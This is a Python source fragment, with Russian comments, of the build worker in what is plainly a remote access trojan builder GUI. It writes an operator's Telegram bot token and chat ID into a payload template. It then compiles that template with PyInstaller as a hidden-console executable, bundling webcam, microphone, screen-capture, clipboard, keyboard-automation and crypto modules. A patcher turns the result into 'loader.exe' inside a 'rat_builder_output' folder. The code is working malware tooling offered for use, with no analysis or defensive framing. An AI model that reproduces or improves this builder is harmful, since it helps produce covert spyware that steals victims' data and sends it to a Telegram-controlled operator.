# language: Python 3.11, file: builder_gui.py (фрагмент — только BuildWorker)
import os
import sys
import re
import time
import shutil
import threading
import subprocess
import tempfile
from pathlib import Path

from PyQt6.QtCore import QThread, pyqtSignal

if getattr(sys, "frozen", False):
    APP_DIR = Path(sys._MEIPASS)
else:
    APP_DIR = Path(__file__).resolve().parent

TEMPLATE = APP_DIR / "build.py"
PATCHER = APP_DIR / "patcher.py"
VENDOR = APP_DIR / "vendor"

CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)


class BuildWorker(QThread):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    finished_ok = pyqtSignal(str)
    finished_err = pyqtSignal(str)

    def __init__(self, token: str, chat_id: str):
        super().__init__()
        self.token = token
        self.chat_id = chat_id
        self._abort = False

    def _interruptible_sleep(self, seconds: float):
        end = time.time() + seconds
        while time.time() < end:
            if self._abort:
                return False
            time.sleep(0.1)
        return True

    def _run_with_monitor(self, cmd, cwd, pct_start, pct_end,
                          max_retries=2, step_timeout=300):
        """
        Прямой Popen без cmd /c. Поток-читатель сливает stdout в лог,
        главный цикл следит за poll() и hard-timeout. При падении — ретрай.
        """
        attempt = 0
        last_rc = -1

        while attempt <= max_retries and not self._abort:
            attempt += 1
            self.log.emit(f"[*] attempt {attempt}/{max_retries + 1}")
            self.log.emit(f"$ {subprocess.list2cmdline([str(c) for c in cmd])}")

            try:
                proc = subprocess.Popen(
                    [str(c) for c in cmd],
                    cwd=str(cwd),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    creationflags=CREATE_NO_WINDOW,
                )
            except FileNotFoundError as e:
                self.log.emit(f"[!] cannot start: {e}")
                last_rc = -2
                if not self._interruptible_sleep(2):
                    return -1
                continue

            state = {"last": time.time()}

            def _reader(stream, log_fn, st):
                try:
                    for line in stream:
                        log_fn(line.rstrip())
                        st["last"] = time.time()
                except Exception:
                    pass
                finally:
                    try:
                        stream.close()
                    except Exception:
                        pass

            reader = threading.Thread(
                target=_reader, args=(proc.stdout, self.log.emit, state),
                daemon=True,
            )
            reader.start()

            killed_reason = None
            while proc.poll() is None:
                if self._abort:
                    proc.kill()
                    killed_reason = "abort"
                    break
                if time.time() - state["last"] > step_timeout:
                    self.log.emit(f"[!] hard timeout {step_timeout}s — killing")
                    proc.kill()
                    killed_reason = "timeout"
                    break
                time.sleep(0.2)

            reader.join(timeout=3)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

            last_rc = proc.returncode if proc.returncode is not None else -1

            if killed_reason == "abort":
                return -1

            if last_rc == 0:
                self.progress.emit(pct_end)
                return 0

            self.log.emit(f"[!] step failed rc={last_rc} "
                          f"({'timeout' if killed_reason == 'timeout' else 'error'})")
            if attempt <= max_retries:
                self.log.emit("[*] restarting in 2s…")
                if not self._interruptible_sleep(2):
                    return -1

        self.log.emit(f"[!] exhausted retries, last rc={last_rc}")
        return last_rc

    def run(self):
        try:
            with tempfile.TemporaryDirectory(prefix="ratbuild_") as tmpdir:
                tmp = Path(tmpdir)

                # 1. подготовка
                self.progress.emit(5)
                self.log.emit("[*] Preparing workspace…")
                try:
                    shutil.copy(TEMPLATE, tmp / "build.py")
                    shutil.copy(PATCHER, tmp / "patcher.py")
                except FileNotFoundError as e:
                    self.finished_err.emit(f"missing file: {e.filename}")
                    return

                # 2. инжект
                self.progress.emit(10)
                src = (tmp / "build.py").read_text(encoding="utf-8")
                src, n1 = re.subn(r'BOT_TOKEN\s*=\s*"[^"]*"',
                                  f'BOT_TOKEN = "{self.token}"', src)
                src, n2 = re.subn(r'OPERATOR_ID\s*=\s*"[^"]*"',
                                  f'OPERATOR_ID = "{self.chat_id}"', src)
                if not n1 or not n2:
                    self.finished_err.emit("inject failed: placeholder not found")
                    return
                (tmp / "build.py").write_text(src, encoding="utf-8")
                self.log.emit("[*] Token & chat_id injected.")

                # 3. PyInstaller с ретраями
                self.progress.emit(30)
                self.log.emit("[*] PyInstaller building payload…")
                pyi_cmd = [
                    sys.executable, "-u", "-m", "PyInstaller",
                    "--onefile", "--noconsole", "--clean", "--noconfirm",
                    "--name", "build",
                ]
                if VENDOR.exists():
                    pyi_cmd += ["--paths", str(VENDOR)]
                    for mod in ("telebot", "psutil", "cv2", "sounddevice",
                                "soundfile", "PIL", "pyautogui", "pyperclip",
                                "requests", "win32api", "Crypto", "mss"):
                        pyi_cmd += ["--hidden-import", mod]
                pyi_cmd.append(str(tmp / "build.py"))

                rc = self._run_with_monitor(
                    pyi_cmd, tmp, pct_start=30, pct_end=75,
                    max_retries=2, step_timeout=300,
                )
                exe = tmp / "dist" / "build.exe"
                if rc != 0 or not exe.exists():
                    self.finished_err.emit(
                        f"PyInstaller failed after retries (rc={rc}). "
                        f"See log above for traceback."
                    )
                    return

                # 4. патчер с ретраями
                self.progress.emit(78)
                self.log.emit("[*] Applying patcher…")
                rc = self._run_with_monitor(
                    [sys.executable, "-u", str(tmp / "patcher.py"), str(exe)],
                    tmp, pct_start=78, pct_end=94,
                    max_retries=1, step_timeout=120,
                )
                loader = exe.parent / "loader.exe"
                if rc != 0 or not loader.exists():
                    self.finished_err.emit(f"patcher failed (rc={rc})")
                    return

                # 5. вынос артефакта
                self.progress.emit(97)
                out_dir = Path(os.path.expanduser("~")) / "rat_builder_output"
                out_dir.mkdir(parents=True, exist_ok=True)
                out = out_dir / "loader.exe"
                if out.exists():
                    try:
                        out.unlink()
                    except PermissionError:
                        out = out_dir / f"loader_{int(time.time())}.exe"
                shutil.copy(loader, out)
                self.progress.emit(100)
                self.log.emit(f"[+] Done: {out}")
                self.finished_ok.emit(str(out))

        except Exception as e:
            self.finished_err.emit(f"{type(e).__name__}: {e}")
